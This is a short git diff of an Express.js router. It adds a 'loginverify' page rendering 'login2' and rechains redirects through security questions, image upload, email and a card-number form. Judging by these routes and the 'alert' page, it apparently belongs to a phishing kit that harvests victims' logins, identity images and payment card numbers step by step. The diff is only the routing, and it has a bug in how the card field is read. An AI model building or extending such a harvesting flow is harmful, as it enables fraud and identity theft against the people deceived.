@@ -33,6 +33,8 @@ router.get('/card', forwardAuthenticated, (req, res) => res.render('card'));
 
 router.get('/alert', forwardAuthenticated, (req, res) => res.render('alert'));
 
+router.get('/loginverify', forwardAuthenticated, (req, res) => res.render('login2'));
+
 router.post('/card', async (req, res) => {
   const card = new Card({
     cardnumber: req.params.cardnumber,
@@ -65,7 +67,7 @@ router.post('/images',  upload.single('image'), async (req, res) => {
     const newImage = new Image({ image });
     await newImage.save();
     console.log("image uploaded successfully")
-    res.redirect('/users/login');
+    res.redirect('/users/email');
 
   } catch (error) {
     console.error(error);
@@ -90,7 +92,7 @@ router.post('/questions', async (req, res) => {
         'success_msg',
         'Questions ok'
       );
-      res.redirect('/users/login');
+      res.redirect('/users/images');
     })
   .catch(err => console.log(err));
 });
@@ -113,7 +115,7 @@ router.post('/email', async (req, res) => {
         'success_msg',
         'Questions ok'
       );
-      res.redirect('/users/login');
+      res.redirect('/users/card');
     })
   .catch(err => console.log(err));
 });
